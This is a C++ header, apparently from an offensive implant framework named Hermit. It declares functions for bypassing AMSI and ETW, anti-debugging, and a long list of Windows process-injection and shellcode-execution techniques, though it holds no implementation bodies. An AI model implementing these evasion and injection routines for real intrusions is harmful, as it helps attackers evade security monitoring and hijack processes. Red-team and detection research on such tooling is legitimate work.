#ifndef HERMIT_CORE_TECHNIQUE_HPP
#define HERMIT_CORE_TECHNIQUE_HPP

#include "core/macros.hpp"
#include "core/procs.hpp"
#include "core/stdout.hpp"
#include "core/system.hpp"
#include "core/utils.hpp"

#include <windows.h>
#include <string>
#include <cstring>
#include <psapi.h>
#include <vector>

// Used for Reflective DLL Injection
typedef BOOL (WINAPI * DLLMAIN)(HINSTANCE, DWORD, LPVOID);
// Used for Shellcode Reflective DLL Injection
#define RVA(type, base, rva) (type)((ULONG_PTR) base + rva)
typedef UINT_PTR(WINAPI * RDI)();
typedef VOID(WINAPI * Function)();

// Used for Anti-Debug
#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)

namespace Technique::AmsiBypass
{
    BOOL PatchAmsi(Procs::PPROCS pProcs);
}

namespace Technique::AntiDebug
{
    VOID StopIfDebug(Procs::PPROCS pProcs);
}

namespace Technique::EtwBypass
{
    BOOL PatchEtw(Procs::PPROCS pProcs);
}

namespace Technique::Injection::Helper
{
    DWORD Rva2Offset(
        DWORD dwRva,
        UINT_PTR uBaseAddr
    );
    DWORD GetFuncOffset(
        LPVOID lpBuffer,
        LPCSTR lpFuncName
    );
    // It's used for Shellcode Reflective DLL Injection
    FARPROC GetProcAddressR(
        HMODULE hModule,
        LPCSTR lpProcName
    );
}

namespace Technique::Injection
{
    // DLL
    BOOL DLLInjection(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    );
    BOOL ReflectiveDLLInjection(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    );

    // PE
    BOOL DirectExecution(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    );
    BOOL ProcessHollowing(
        Procs::PPROCS pProcs,
        const std::wstring &wTargetProcess,
        const std::vector<BYTE>& bytes
    );

    // SHELLCODE
    BOOL ShellcodeInjection(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    );
    BOOL ShellcodeExecutionViaFibers(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    );
    BOOL ShellcodeExecutionViaAPCAndNtTestAlert(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    );
    BOOL EarlyBirdAPCQueueCodeInjection(
        Procs::PPROCS pProcs,
        const std::wstring& wTargetProcess,
        const std::vector<BYTE>& bytes
    );
    BOOL ShellcodeExecutionViaCreateThreadpoolWait(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    );
    BOOL ThreadExecutionHijacking(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    );
    BOOL ShellcodeExecutionViaMemorySections(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    );
    BOOL ShellcodeExecutionViaFindWindow(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    );
    BOOL ShellcodeExecutionViaKernelContextTable(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    );
    BOOL RWXHunting(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    );
    BOOL AddressOfEntryPointInjection(
        Procs::PPROCS pProcs,
        const std::wstring& wTargetProcess,
        const std::vector<BYTE>& bytes
    );
    BOOL ModuleStomping(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    );
    BOOL DirtyVanity(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    );
    BOOL ProcessMockingjay(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    );
}

#endif // HERMIT_CORE_TECHNIQUE_HPP